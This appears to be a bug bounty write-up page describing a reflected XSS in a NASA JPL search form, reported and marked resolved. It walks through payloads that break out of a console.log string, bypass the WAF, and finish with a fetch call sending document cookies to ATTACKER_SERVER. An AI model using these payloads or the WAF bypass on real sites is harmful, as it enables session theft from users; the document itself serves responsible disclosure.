---
layout: default
submission_id: "4b01725e-288b-4db5-a38c-1a37f827d215"
official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f827d215"
---

<div class="container">
  <div class="lang-switcher">
    <a href="/es/bounties/4b01725e-288b-4db5-a38c-1a37f827d215/" class="lang-btn"><span class="label-full">Español (ES)</span><span class="label-short">ES</span></a>
    <a href="./" class="lang-btn active"><span class="label-full">English (EN)</span><span class="label-short">EN</span></a>
  </div>
<article>
  <a href="/en/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>Search Form XSS Cookie Exfiltration with WAF Bypass</h1>
    <p style="color: var(--p3); font-weight: 600;">National Aeronautics and Space Administration Jet Propulsion Laboratory (NASA JPL)</p>
  </div>

  <div class="bounty-content">
    <h2>🔍 Search Anything</h2>
    <p>As with any bug bounty program, the first thing we did was use the page as any normal user would. The search field stood out at first glance, so we decided to try it out.</p>
    <pre><code>https://[REDACTED].nasa.gov/search.htm?search=pwn</code></pre>
    <p>This is where we realized that the value we were adding was reflected on the website.</p>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/a679dc515d4d0564710911ddb57b6e9a.png" alt="Search Normal">
    <p>We decided to carefully inspect the website's source code and realized that our input was inside a <code>console.log()</code> function.</p>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/f4adceabac940d2709d032787a93236f.png" alt="Search Normal Result">

    <hr>
    <h2>🛡️ Tag &lt;script&gt; Disallowed</h2>
    <p>We ran some basic tests that are performed to try to detect XSS attacks:</p>
    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
    <p>All we got was that the Web Application Firewall (WAF) rejected our requests at the slightest sign of malicious activity.</p>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/546b2f225d101e29c3a618b41645a151.png" alt="Blocked by WAF">

    <hr>
    <h2>🔧 Close Javascript console.log String</h2>
    <p>Building on our initial discovery, we decided to try closing <code>console.log()</code> to insert code right after it using the following payload:</p>
    <pre><code>pwn');</code></pre>
    <p>We inserted <code>')</code> immediately after a string of text, which is what JavaScript needed to close <code>console.log()</code>. However, the semicolon symbol <code>;</code> was not being displayed.</p>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/981af669ba5656927efdac5a9a8a30d5.png" alt="Closing console.log">

    <hr>
    <h2>🧩 Append Javascript (Not Working)</h2>
    <pre><code>pwn');alert(1)</code></pre>
    <p>We tried again, but with some text after the semicolon. After several tests, we couldn't get the semicolon to appear. Worse still, everything after the semicolon didn't even appear in the text.</p>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/3fe13a271aa6a7120aa40703c0933005.png" alt="Where is semicolon">

    <hr>
    <h2>🧱 Append Javascript (Bypass)</h2>
    <p>To make it work and start injecting code, we had to encode the semicolon in HTML format, changing it from <code>;</code> to <code>%3b</code>.</p>
    <pre><code>pwn')%3balert(1)</code></pre>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/8c14339a9b0347ef35e6369350a6964b.png" alt="Bypass Semicolon">

    <hr>
    <h2>💥 First Alert (Working)</h2>
    <p>Although the WAF did not accept the <code>&lt;script&gt;</code> tag, we managed to get it to render the <code>&lt;/script&gt;</code> tag, which was enough to carry out a REFLECTED XSS attack.</p>
    <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/077c7c91a0c356a8223587714c9805ac.png" alt="Alert 1">
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/8eaccafb86685327e7c52132978cb579.png" alt="Alert 1 HTML">

    <hr>
    <h2>🚫 Second Alert (Firewall Blocks)</h2>
    <p>Once we had managed to execute an <code>alert()</code> on the web page, we wanted to go further and attempt to read a user's cookies. The WAF continued to reject our requests as soon as it detected suspicious strings such as <code>document.cookie</code>.</p>
    <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/546b2f225d101e29c3a618b41645a151.png" alt="Blocked by WAF">

    <hr>
    <h2>🕵️ Firewall Bypass for Cookies</h2>
    <p>The WAF rejected strings like <code>document.cookie</code>. To achieve an effective WAF bypass, we created a variable <code>a</code> that contained <code>document</code>, and we requested <code>cookie</code> from that variable.</p>
    <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/fece825e7c28a4322c047f5534284e90.png" alt="Document Cookie Alert">
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/444b81920a1d001cbad4f1bdd1bf4e11.png" alt="Document Cookie Result">

    <hr>
    <h2>🚀 Final Exploit (Cookies Exfiltration)</h2>
    <p>Instead of executing <code>alert</code>, we executed <code>fetch</code> to sending a request to a server controlled by the attacker.</p>
    <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/4dbf4c3c830303dce1488a8522b68935.png" alt="Final Exploit">
    <img src="/assets/images/4b01725e-288b-4db5-a38c-1a37f827d215/85f2210c208a80164de2adf36e1cc284.png" alt="Exfiltration Request">

    <hr>
    <h2>📜 Official Recognition</h2>
    <div class="pdf-container">
      <iframe src="/assets/others/4b01725e-288b-4db5-a38c-1a37f827d215/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
    </div>
    
    <div style="text-align: center; margin-top: 1rem;">
      <a href="/assets/others/4b01725e-288b-4db5-a38c-1a37f827d215/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Download Official Letter (PDF)</a>
    </div>

    <hr>
    <h2>🤝 Collaboration Details</h2>
    <p>This research was conducted in a joint effort with the following researchers:</p>
    <div class="collab-grid">
      <div class="collab-card">
        <div class="collab-avatar">
          <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </div>
        <div class="collab-body">
          <div class="collab-name">{{ site.researchers.ivan.name }}</div>
          <div class="collab-links">
            <a class="social-pill" href="{{ site.researchers.ivan.bugcrowd }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 7v10l9 5 9-5V7L12 2zm0 2.5l6.5 3.6v7.8L12 17.5l-6.5-3.6v-7.8L12 4.5z"/><path d="M10 9h4v6h-4V9zm1-1h2v2h-2V8z"/></svg>
              <span>Bugcrowd</span>
            </a>
            <a class="social-pill" href="{{ site.researchers.ivan.linkedin }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4V9h4v2"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
              <span>LinkedIn</span>
            </a>
          </div>
        </div>
      </div>

      <div class="collab-card">
        <div class="collab-avatar">
          <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </div>
        <div class="collab-body">
          <div class="collab-name">{{ site.researchers.diego.name }}</div>
          <div class="collab-links">
            <a class="social-pill" href="{{ site.researchers.diego.bugcrowd }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 7v10l9 5 9-5V7L12 2zm0 2.5l6.5 3.6v7.8L12 17.5l-6.5-3.6v-7.8L12 4.5z"/><path d="M10 9h4v6h-4V9zm1-1h2v2h-2V8z"/></svg>
              <span>Bugcrowd</span>
            </a>
            <a class="social-pill" href="{{ site.researchers.diego.linkedin }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4V9h4v2"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
              <span>LinkedIn</span>
            </a>
          </div>
        </div>
      </div>
    </div>

    <div class="meta-grid">
      <div class="meta-card">
        <div class="meta-left">
          <div class="meta-icon">
            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"></path></svg>
          </div>
          <div class="meta-title">
            <strong>Status</strong>
          </div>
        </div>
        <div class="meta-badge success">Resolved</div>
      </div>

      <div class="meta-card">
        <div class="meta-left">
          <div class="meta-icon">
            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 9v4"></path><path d="M12 17h.01"></path><path d="M10.29 3.86l-8.12 14.06A2 2 0 0 0 3.9 21h16.2a2 2 0 0 0 1.73-3.08L13.71 3.86a2 2 0 0 0-3.42 0z"></path></svg>
          </div>
          <div class="meta-title">
            <strong>Severity</strong>
          </div>
        </div>
        <div class="meta-badge badge badge-p3">Medium</div>
      </div>
    </div>

    <div class="verification-panel">
      <h3>Verification</h3>
      <div class="verification-grid">
        <div class="verification-item">
          <small>Submission ID</small>
          <div class="value">{{ page.submission_id | default: 'N/A' }}</div>
        </div>
        <div class="verification-item">
          <small>Official Link</small>
          <div class="value">
            {% if page.official_link %}
              <a href="{{ page.official_link }}" target="_blank" rel="noopener noreferrer">{{ page.official_link }}</a>
            {% else %}
              N/A
            {% endif %}
          </div>
        </div>
      </div>
    </div>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Zoomed Image">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
